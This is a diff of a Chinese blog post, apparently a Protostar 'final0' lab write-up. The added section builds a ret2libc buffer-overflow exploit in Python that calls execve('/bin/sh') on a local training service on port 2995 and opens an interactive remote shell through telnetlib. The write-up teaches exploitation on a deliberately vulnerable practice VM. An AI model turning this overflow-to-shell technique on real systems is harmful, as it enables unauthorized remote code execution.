@@ -104,7 +104,16 @@
 <meta property="og:image" content="https://i.imgur.com/LhsjIln.png">
 <meta property="og:image" content="https://i.imgur.com/po6Mei4.png">
 <meta property="og:image" content="https://i.imgur.com/Z6xTplL.png">
-<meta property="og:updated_time" content="2018-11-10T14:38:16.953Z">
+<meta property="og:image" content="https://i.imgur.com/DSWIEkS.png">
+<meta property="og:image" content="https://i.imgur.com/fBO0sK2.png">
+<meta property="og:image" content="https://i.imgur.com/MbwYZ5p.png">
+<meta property="og:image" content="https://i.imgur.com/ET3qCA6.png">
+<meta property="og:image" content="https://i.imgur.com/xXmQ5Ez.png">
+<meta property="og:image" content="https://i.imgur.com/F97KcUN.png">
+<meta property="og:image" content="https://i.imgur.com/yctTz06.png">
+<meta property="og:image" content="https://i.imgur.com/Ijr8ksM.png">
+<meta property="og:image" content="https://i.imgur.com/40r4Dx2.png">
+<meta property="og:updated_time" content="2018-11-11T06:03:32.281Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Liveoverflow-0x1D-final0">
 <meta name="twitter:description" content="终于到了final部分(°ཀ°) final部分将之前学过的知识都综合起来了，难度稍有提升。主要还是多熟悉一下才学的网络部分。">
@@ -423,8 +432,30 @@
 <p>toupper：闭嘴，你们几个都是坑b。</p>
 <p>到头来还是我被坑了(╯’-‘)╯ ┻━━━┻</p>
 <h1 id="再次解题"><a href="#再次解题" class="headerlink" title="再次解题"></a>再次解题</h1><p>用返回到栈里执行shellcode的方法既不可靠也不高大上，所以换一种方法解题。</p>
-<p><strong>ret2libc</strong>。这个办法之前做stack部分的时候也用到过，这个办法就要比单纯返回栈执行shellcode可靠。</p>
-<h2 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h2><p>既然要ret2libc就要先找到有哪些libc的函数可以被我们利用。</p>
+<p><strong>ret2libc</strong>。这个办法之前做stack部分的时候也用到过，比单纯返回栈执行shellcode可靠。</p>
+<p>既然要ret2libc就要先找到有哪些已经在内存中的libc的函数可以被我们利用。</p>
+<p><img src="https://i.imgur.com/DSWIEkS.png" alt=""></p>
+<p><code>info functions @plt</code>查看可用的函数(先su拿到root)</p>
+<p><img src="https://i.imgur.com/fBO0sK2.png" alt=""></p>
+<p>发现有<code>execve</code>，这个函数可以帮我们执行/bin/sh，就用它了。<br>记下地址<strong>0x08048c0c</strong></p>
+<blockquote>
+<p><em>execve()  executes  the  program  pointed to by filename.  filename must be either a binary executable</em></p>
+</blockquote>
+<p>写一小段程序看看用<code>execve</code>运行/bin/sh时栈内是怎么布局的，然后payload就仿照这个布局。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	execve(<span class="string">"/bin/sh"</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://i.imgur.com/MbwYZ5p.png" alt=""></p>
+<p>第一个数据(红框)是返回值，也就是返回main的地址，构造payload时不用管它，随便填一个数据就行了，因为我们不需要它返回。第二个数据(蓝框)就是/bin/sh的地址，所以要找到/bin/sh的地址(libc的起始地址 + /bin/sh的偏移地址)</p>
+<p><img src="https://i.imgur.com/ET3qCA6.png" alt=""></p>
+<p><img src="https://i.imgur.com/xXmQ5Ez.png" alt=""><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">s.connect((<span class="string">"127.0.0.1"</span>, <span class="number">2995</span>))</span><br><span class="line">padding = <span class="string">"A"</span>*<span class="number">511</span> + <span class="string">"\x00"</span> + <span class="string">"AAAABBBBCCCCDDDDEEEE"</span></span><br><span class="line">execve = struct.pack(<span class="string">"I"</span>, <span class="number">0x08048c0c</span>)</span><br><span class="line">bsh = struct.pack(<span class="string">"I"</span>, <span class="number">0xb7e97000</span> + <span class="number">1176511</span>)</span><br><span class="line">arg = <span class="string">"AAAA"</span> + bsh + <span class="string">"\x00"</span>*<span class="number">8</span></span><br><span class="line">s.send(padding + execve + arg + <span class="string">"\n"</span>)</span><br><span class="line">s.send(<span class="string">"id\n"</span>)</span><br><span class="line"><span class="keyword">print</span> s.recv(<span class="number">1024</span>)</span><br><span class="line">s.send(<span class="string">"uname -a\n"</span>)</span><br><span class="line"><span class="keyword">print</span> s.recv(<span class="number">1024</span>)</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://i.imgur.com/F97KcUN.png" alt=""></p>
+<p>成功。</p>
+<p>可是这样还不够，还要再高大上一点(✧≖‿ゝ≖)</p>
+<p>使用python的telnetlib模块对服务器进行连接实现远程操控。</p>
+<p>修改后的脚本<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> telnetlib</span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">s.connect((<span class="string">"127.0.0.1"</span>, <span class="number">2995</span>))</span><br><span class="line">padding = <span class="string">"A"</span>*<span class="number">511</span> + <span class="string">"\x00"</span> + <span class="string">"AAAABBBBCCCCDDDDEEEE"</span></span><br><span class="line">execve = struct.pack(<span class="string">"I"</span>, <span class="number">0x08048c0c</span>)</span><br><span class="line">bsh = struct.pack(<span class="string">"I"</span>, <span class="number">0xb7e97000</span> + <span class="number">1176511</span>)</span><br><span class="line">arg = <span class="string">"AAAA"</span> + bsh + <span class="string">"\x00"</span>*<span class="number">8</span></span><br><span class="line">s.send(padding + execve + arg + <span class="string">"\n"</span>)</span><br><span class="line">s.send(<span class="string">"id\n"</span>)</span><br><span class="line">s.send(<span class="string">"uname -a\n"</span>)</span><br><span class="line"><span class="keyword">print</span> s.recv(<span class="number">1024</span>)</span><br><span class="line"></span><br><span class="line">t = telnetlib.Telnet()</span><br><span class="line">t.sock = s</span><br><span class="line">t.interact()</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://i.imgur.com/yctTz06.png" alt=""></p>
+<p>如果在同一个局域网内并且知道这台机器的ip的话(<code>ip addr</code>)，也可以在外面用同一个脚本进行连接，改一下ip就行了</p>
+<p><img src="https://i.imgur.com/Ijr8ksM.png" alt=""></p>
+<p><img src="https://i.imgur.com/40r4Dx2.png" alt=""></p>
+<p>nice~</p>
 
       
     </div>
@@ -595,7 +626,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Protostar-Final0"><span class="nav-number">1.</span> <span class="nav-text">Protostar Final0</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#About"><span class="nav-number">1.1.</span> <span class="nav-text">About</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#分析"><span class="nav-number">2.</span> <span class="nav-text">分析</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#解题"><span class="nav-number">3.</span> <span class="nav-text">解题</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#再次分析"><span class="nav-number">4.</span> <span class="nav-text">再次分析</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#再次解题"><span class="nav-number">5.</span> <span class="nav-text">再次解题</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#分析-1"><span class="nav-number">5.1.</span> <span class="nav-text">分析</span></a></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Protostar-Final0"><span class="nav-number">1.</span> <span class="nav-text">Protostar Final0</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#About"><span class="nav-number">1.1.</span> <span class="nav-text">About</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#分析"><span class="nav-number">2.</span> <span class="nav-text">分析</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#解题"><span class="nav-number">3.</span> <span class="nav-text">解题</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#再次分析"><span class="nav-number">4.</span> <span class="nav-text">再次分析</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#再次解题"><span class="nav-number">5.</span> <span class="nav-text">再次解题</span></a></li></ol></div>
             
 
           </div>
